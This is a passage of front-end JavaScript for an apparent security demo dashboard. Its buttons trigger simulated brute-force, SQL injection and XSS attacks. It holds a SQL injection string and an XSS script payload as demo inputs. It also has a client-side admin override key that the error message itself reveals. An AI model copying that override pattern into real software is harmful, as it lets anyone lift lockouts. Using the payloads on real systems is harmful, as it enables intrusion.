      elements.socDrawerBackdrop.addEventListener('click', (e) => {
        if (e.target === elements.socDrawerBackdrop) {
          closeSocDrawer();
        }
      });
    }

    // Refresh Telemetry Button
    if (elements.btnDrawerRefresh) {
      elements.btnDrawerRefresh.addEventListener('click', async () => {
        elements.btnDrawerRefresh.style.opacity = '0.5';
        await fetchAdminTelemetry();
        setTimeout(() => {
          elements.btnDrawerRefresh.style.opacity = '1';
        }, 300);
      });
    }

    // Drawer Simulation Buttons
    if (elements.btnSocQuickBrute) {
      elements.btnSocQuickBrute.addEventListener('click', () => {
        triggerSimulatedAttack('BRUTE_FORCE_TRIGGER');
      });
    }

    if (elements.btnSocQuickSqli) {
      elements.btnSocQuickSqli.addEventListener('click', () => {
        triggerSimulatedAttack('SQLI', "' UNION SELECT * FROM users--");
      });
    }

    if (elements.btnSocQuickXss) {
      elements.btnSocQuickXss.addEventListener('click', () => {
        triggerSimulatedAttack('XSS', "<script>alert('XSS Deflected')</script>");
      });
    }

    if (elements.btnSocQuickUnblockAll) {
      elements.btnSocQuickUnblockAll.addEventListener('click', () => {
        handleOneClickUnblock({ overrideAll: true });
      });
    }

    // Drawer Tabs Navigation
    if (elements.tabBtnLockouts && elements.tabBtnWaf) {
      elements.tabBtnLockouts.addEventListener('click', () => {
        elements.tabBtnLockouts.classList.add('active');
        elements.tabBtnWaf.classList.remove('active');
        elements.panelLockouts.classList.add('active');
        elements.panelWaf.classList.remove('active');
      });

      elements.tabBtnWaf.addEventListener('click', () => {
        elements.tabBtnWaf.classList.add('active');
        elements.tabBtnLockouts.classList.remove('active');
        elements.panelWaf.classList.add('active');
        elements.panelLockouts.classList.remove('active');
      });
    }

    // Admin Override Modal
    if (elements.btnOpenOverride) {
      elements.btnOpenOverride.addEventListener('click', () => {
        elements.overrideModal.classList.add('active');
      });
    }

    if (elements.btnCloseOverride) {
      elements.btnCloseOverride.addEventListener('click', () => {
        elements.overrideModal.classList.remove('active');
      });
    }

    if (elements.overrideForm) {
      elements.overrideForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const key = elements.overrideKeyInput.value.trim();
        if (key === 'SOC-RESET-2026') {
          handleOneClickUnblock({ overrideAll: true });
          elements.overrideModal.classList.remove('active');
        } else {
          alert('Invalid SOC Override Key. Presentation Master Key: SOC-RESET-2026');
        }
      });
    }

    // Logout
    if (elements.btnLogout) {
      elements.btnLogout.addEventListener('click', async () => {
        try {
          await fetch('/api/auth/logout', { method: 'POST' });
        } catch (e) {}
        window.location.href = '/';
      });
    }

    // Keyboard Shortcuts (Esc to close drawer)
    window.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        closeSocDrawer();
        if (elements.overrideModal) elements.overrideModal.classList.remove('active');
      }
    });
  }

  // Run Initialization when DOM is ready
  document.addEventListener('DOMContentLoaded', initWebShield);
})();







